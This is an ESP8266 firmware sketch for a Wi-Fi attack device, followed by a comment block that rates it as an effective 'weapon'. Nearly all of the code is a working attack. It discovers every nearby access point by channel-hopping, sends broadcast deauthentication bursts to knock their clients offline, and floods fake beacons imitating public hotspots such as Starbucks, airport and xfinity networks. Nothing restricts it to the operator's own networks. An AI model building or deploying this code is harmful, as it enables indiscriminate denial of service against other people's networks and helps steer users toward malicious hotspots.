// ESP8266 Smart Multi-Target Deauther + Fake Beacon Flood
// Description:
// - Scans APs via promiscuous beacon sniffing and sends deauth packets (Denial of Service).
// - Injects fake AP beacons to confuse clients and pollute SSID lists (Deception/Confusion).
// - Alternates between attacking real APs and flooding fake beacons.

// --- LIBRARIES ---
#include <ESP8266WiFi.h>      // Core library for ESP8266 Wi-Fi functions.
extern "C" {
  #include "user_interface.h" // Provides low-level SDK functions, including promiscuous mode and packet injection.
}

// === CONFIGURATION ===
#define MAX_APS 20            // The maximum number of real Access Points the device will track and attack.
#define DEAUTH_BURSTS 5       // The number of deauth packets to send in each attack burst.
#define CHANNEL_HOP_INTERVAL 5000 // How often (in ms) to hop to a new channel for discovering real APs.
#define AP_TTL 15000          // Time-To-Live (in ms). Real APs not seen for this duration will be removed from the list.
#define FAKE_BEACON_INTERVAL 100 // How often (in ms) to send a fake beacon packet.
#define MAX_FAKE_APS 10       // The number of fake APs defined in the list.

// === GLOBAL STRUCTS & VARIABLES ===
// Structure to hold information about a real, discovered Access Point.
struct APEntry {
  uint8_t mac[6];
  uint8_t channel;
  unsigned long lastSeen;
};

// Structure to hold information for a fake Access Point to be advertised.
struct FakeAP {
  char ssid[32];
  uint8_t mac[6];
  uint8_t channel;
};

APEntry aps[MAX_APS];     // Array to store the list of real APs.
uint8_t apCount = 0;        // Counter for the number of real APs found.
uint8_t currentAP = 0;      // Index for cycling through the real APs to attack.
unsigned long lastChannelHop = 0; // Timestamp for managing discovery channel hopping.
uint8_t currentChannel = 1;   // Current channel for discovery.

// A hardcoded list of fake Access Points to advertise.
// These are designed to look like common, appealing public Wi-Fi networks.
FakeAP fakeAPs[MAX_FAKE_APS] = {
  {"Free_WiFi",     {0xDE, 0xAD, 0xBE, 0x01, 0x02, 0x03}, 1},
  {"Starbucks_Free",{0xDE, 0xAD, 0xBE, 0x02, 0x02, 0x03}, 6},
  {"Airport_WiFi",  {0xDE, 0xAD, 0xBE, 0x03, 0x02, 0x03}, 11},
  {"xfinitywifi",   {0xDE, 0xAD, 0xBE, 0x04, 0x02, 0x03}, 1},
  {"Free_Hotspot",  {0xDE, 0xAD, 0xBE, 0x05, 0x02, 0x03}, 6},
  {"TP-Link_5G",    {0xDE, 0xAD, 0xBE, 0x06, 0x02, 0x03}, 11},
  {"Office_AP",     {0xDE, 0xAD, 0xBE, 0x07, 0x02, 0x03}, 3},
  {"Hotel_Guest",   {0xDE, 0xAD, 0xBE, 0x08, 0x02, 0x03}, 9},
  {"MySSID123",     {0xDE, 0xAD, 0xBE, 0x09, 0x02, 0x03}, 7},
  {"PublicNet",     {0xDE, 0xAD, 0xBE, 0x10, 0x02, 0x03}, 4}
};

// --- PACKET TEMPLATES ---
uint8_t deauthPacket[26] = {
  0xC0, 0x00, 0x3A, 0x01, // Type/Subtype: Deauth, Duration
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: Broadcast
  0, 0, 0, 0, 0, 0,       // Source (will be replaced with real AP's MAC)
  0, 0, 0, 0, 0, 0,       // BSSID (will be replaced with real AP's MAC)
  0x00, 0x00,             // Fragment & Sequence
  0x07, 0x00              // Reason Code
};

// --- AP LIST MANAGEMENT (for real APs) ---
void registerAP(uint8_t* bssid, uint8_t channel) {
  for (uint8_t i = 0; i < apCount; i++) {
    if (memcmp(aps[i].mac, bssid, 6) == 0) {
      aps[i].lastSeen = millis();
      aps[i].channel = channel;
      return;
    }
  }
  if (apCount < MAX_APS) {
    memcpy(aps[apCount].mac, bssid, 6);
    aps[apCount].channel = channel;
    aps[apCount].lastSeen = millis();
    apCount++;
  }
}

// --- PROMISCUOUS CALLBACK (for real APs) ---
void snifferCallback(uint8_t* buf, uint16_t len) {
  if (len < 36) return;
  uint8_t frameType = buf[0];
  if ((frameType & 0xF0) == 0x80) { // Beacon frame
    uint8_t* bssid = &buf[10];
    uint8_t channel = buf[36];
    registerAP(bssid, channel);
  }
}

// --- UTILITY & ATTACK FUNCTIONS ---
// Sets the source and BSSID in the deauth packet template.
void setDeauthMACs(uint8_t* mac) {
  memcpy(&deauthPacket[10], mac, 6);
  memcpy(&deauthPacket[16], mac, 6);
}

// Constructs and sends a fake 802.11 Beacon frame.
void sendFakeBeacon(FakeAP& ap) {
  uint8_t ssidLen = strlen(ap.ssid);
  // This is a simplified, hardcoded beacon frame.
  uint8_t pkt[128] = {
    0x80, 0x00, 0x00, 0x00, // Frame Control: Beacon
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: Broadcast
    // The Source and BSSID are set to the fake AP's MAC address.
    ap.mac[0], ap.mac[1], ap.mac[2], ap.mac[3], ap.mac[4], ap.mac[5],
    ap.mac[0], ap.mac[1], ap.mac[2], ap.mac[3], ap.mac[4], ap.mac[5],
    0x00, 0x00, // Fragment & Sequence
    // --- Fixed Parameters ---
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp
    0x64, 0x00, // Beacon Interval
    0x01, 0x04, // Capability Info
    // --- Information Elements (IEs) ---
    0x00, ssidLen // IE: SSID, followed by its length
  };
  // Copy the SSID name into the packet.
  memcpy(pkt + 38, ap.ssid, ssidLen);
  
  // Add the DS Parameter Set IE (Channel).
  pkt[38 + ssidLen] = 0x03;
  pkt[38 + ssidLen + 1] = 0x01;
  pkt[38 + ssidLen + 2] = ap.channel;

  // Tune the radio to the correct channel for the fake beacon.
  wifi_set_channel(ap.channel);
  // Inject the fully constructed fake beacon packet into the air.
  wifi_send_pkt_freedom(pkt, 38 + ssidLen + 3, 0);
}

// --- SETUP FUNCTION ---
void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_STA);
  delay(100);

  wifi_set_opmode(STATION_MODE);
  wifi_promiscuous_enable(0);
  wifi_set_promiscuous_rx_cb(snifferCallback);
  wifi_promiscuous_enable(1);

  Serial.println("[INFO] Deauther + Fake Beacon initialized");
}

// --- MAIN LOOP ---
void loop() {
  unsigned long now = millis();

  // --- REAL AP LIST MANAGEMENT ---
  // Clean expired APs from the list.
  for (uint8_t i = 0; i < apCount;) {
    if (now - aps[i].lastSeen > AP_TTL) {
      for (uint8_t j = i; j < apCount - 1; j++) aps[j] = aps[j + 1];
      apCount--;
    } else {
      i++;
    }
  }

  // --- DISCOVERY ---
  // Hop channels to find real APs.
  if (now - lastChannelHop > CHANNEL_HOP_INTERVAL) {
    currentChannel = (currentChannel % 13) + 1;
    wifi_set_channel(currentChannel);
    lastChannelHop = now;
    Serial.printf("[HOP] Sniffer channel set to %d\n", currentChannel);
  }

  // --- ATTACK PHASE 1: DEAUTHENTICATION ---
  // If we have found real APs, attack one of them.
  if (apCount > 0) {
    if (currentAP >= apCount) currentAP = 0;
    setDeauthMACs(aps[currentAP].mac);
    wifi_set_channel(aps[currentAP].channel);

    Serial.printf("[DEAUTH] Attacking AP %02X:%02X:%02X:%02X:%02X:%02X on CH %d\n",
      aps[currentAP].mac[0], aps[currentAP].mac[1], aps[currentAP].mac[2],
      aps[currentAP].mac[3], aps[currentAP].mac[4], aps[currentAP].mac[5],
      aps[currentAP].channel);

    for (int i = 0; i < DEAUTH_BURSTS; i++) {
      wifi_send_pkt_freedom(deauthPacket, 26, 0);
      delay(20);
    }
    currentAP++;
  }

  // --- ATTACK PHASE 2: FAKE BEACON FLOOD ---
  // This runs concurrently with the deauth attack.
  static unsigned long lastFake = 0;
  if (now - lastFake > FAKE_BEACON_INTERVAL) {
    static uint8_t fakeIndex = 0;
    // Send a beacon for one of the fake APs from our list.
    sendFakeBeacon(fakeAPs[fakeIndex]);
    // Cycle to the next fake AP for the next iteration.
    fakeIndex = (fakeIndex + 1) % MAX_FAKE_APS;
    lastFake = now;
  }
}

// --- CYBERSECURITY ANALYSIS ---
/*
 * This section provides a detailed analysis of the code from a cybersecurity perspective.
 * The scores are based on a comparison to other similar open-source projects and general
 * security principles. The scale is 1-10, where 1 is poor/simple and 10 is excellent/highly advanced.
 */

/*
 * 1. Implementation & Completeness: 9/10
 * 
 * Explanation: This is the most feature-complete, Wi-Fi-only (Layer 2) attack tool in this project.
 * It combines two distinct and effective attack vectors into a single, autonomous weapon.
 * - Dual-Attack Integration: It seamlessly integrates a deauthentication DoS attack with a beacon flood
 *   deception attack. The two run concurrently, creating a highly disruptive environment.
 * - Adaptive Deauthentication: The deauth portion is fully autonomous, with dynamic target discovery,
 *   list management (including TTL), and intelligent channel hopping, inherited from the 'Multi-Iteration' script.
 * - Pre-configured Deception: The beacon flood uses a well-chosen list of common public SSIDs to maximize
 *   its potential for confusing users.
 */

/*
 * 2. Effectiveness & Potency: 9/10
 * 
 * Explanation: The potency of this tool is very high due to its combined-arms approach.
 * - Denial of Service: The deauthentication component is highly effective at preventing legitimate users
 *   from connecting to or staying connected to real networks.
 * - Confusion and Deception: The beacon flood pollutes the list of available networks on any user's device,
 *   making it difficult to identify the legitimate network. This can frustrate users and may lead them
 *   to connect to malicious hotspots set up by an attacker.
 * - Psychological Impact: Seeing a flood of familiar-looking but fake networks can cause confusion and
 *   distrust, which is a powerful secondary effect beyond the simple technical disruption.
 * It is a multi-faceted tool that attacks both the stability of the network and the user's ability to
 * make correct decisions.
 */

/*
 * 3. Stealth & Evasion: 1/10
 * 
 * Explanation: This tool is extremely "loud" and makes no attempt at stealth. Its entire purpose is to
 * create overt chaos on the 2.4GHz Wi-Fi band.
 * - Massive RF Footprint: It is simultaneously flooding the air with deauth packets and beacon packets
 *   on multiple channels. This massive amount of management frame traffic is a blatant and unmistakable
 *   sign of an attack.
 * - Easily Fingerprinted: Any WIDS would immediately detect both the deauth flood and the beacon flood.
 *   The hardcoded fake MAC addresses and SSIDs could also be used to create a specific signature to
 *   identify this exact tool.
 */

/*
 * 4. Sophistication & Novelty: 8/10
 * 
 * Explanation: This script demonstrates a higher level of sophistication by moving beyond a simple DoS
 * attack and incorporating a layer of deception.
 * - Combined Arms Tactic: The concept of combining a DoS attack with a deception/confusion attack in a
 *   single, low-cost microcontroller is a sophisticated tactic. It shows an understanding of how to attack
 *   not just the technology, but also the human user.
 * - Autonomous and Adaptive: It retains the advanced, self-managing logic from the 'Multi-Iteration'
 *   script while adding a completely new attack vector.
 * While the individual techniques are known, their effective integration into one automated tool is a
 * hallmark of a more advanced and well-thought-out design.
 */
